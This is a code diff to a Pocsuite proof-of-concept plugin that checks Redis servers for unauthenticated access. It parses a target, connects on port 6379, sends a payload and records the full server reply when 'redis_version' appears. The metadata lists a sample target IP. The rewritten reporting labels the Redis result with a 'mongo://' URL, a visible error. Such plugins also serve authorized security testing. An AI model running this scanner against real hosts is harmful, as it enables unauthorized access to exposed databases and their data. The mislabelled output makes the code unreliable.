@@ -11,7 +11,7 @@ from pocsuite.api.poc import Output, POCBase
 
 class TestPOC(POCBase):
     vulID = '00002'
-    version = '1'
+    version = '1.0'
     author = 'TideSec'
     vulDate = '2017-08-15'
     createDate = '2017-08-15'
@@ -22,10 +22,26 @@ class TestPOC(POCBase):
     appName = 'Redis'
     appVersion = 'All'
     vulType = 'Unauthorized'
-    desc = 'redis 默认没有开启相关认证, 黑客直接访问即可获取数据库中所有信息.'
+    desc = 'Redis 默认没有开启相关认证, 黑客直接访问即可获取数据库中所有信息.'
     samples = ['128.36.23.111']
     defaultPorts = [6379]
     defaultService = ['Redis key-value store', 'redis']
+
+    def parse_target(self, target, default_port):
+        schema = 'http'
+        port = default_port
+        address = ''
+        if '://' in target:
+            slices = target.split('://')
+            schema = slices[0]
+            target = slices[1]
+        if ':' in target:
+            slices = target.split(':')
+            address = slices[0]
+            port = slices[1]
+        else:
+            address = target
+        return {'schema': schema, 'address': address, 'port': int(port)}
 
     def _verify(self):
         result = {}
@@ -33,19 +49,15 @@ class TestPOC(POCBase):
         s = socket.socket()
         socket.setdefaulttimeout(4)
         try:
-            host = self.target.split(':')[0].strip('/')
-            if len(self.target.split(':')) > 1:
-                port = int(self.target.split(':')[1].strip('/'))
-            else:
-                port = 6379
-            s.connect((host, port))
+            target = self.parse_target(self.target, 6379)
+            s.connect((target['address'], target['port']))
             s.send(payload)
             data = s.recv(1024)
             if data and 'redis_version' in data:
                 result['VerifyInfo'] = {}
-                result['VerifyInfo']['url'] = self.url
-                result['VerifyInfo']['port'] = port
-                result['VerifyInfo']['result'] = data[:20]
+                result['VerifyInfo']['URL'] = "mongo://{}:{}".format(target['address'], target['port'])
+                result['VerifyInfo']['Payload'] = payload
+                result['VerifyInfo']['Result'] = data
         except Exception as e:
             print e
         s.close()
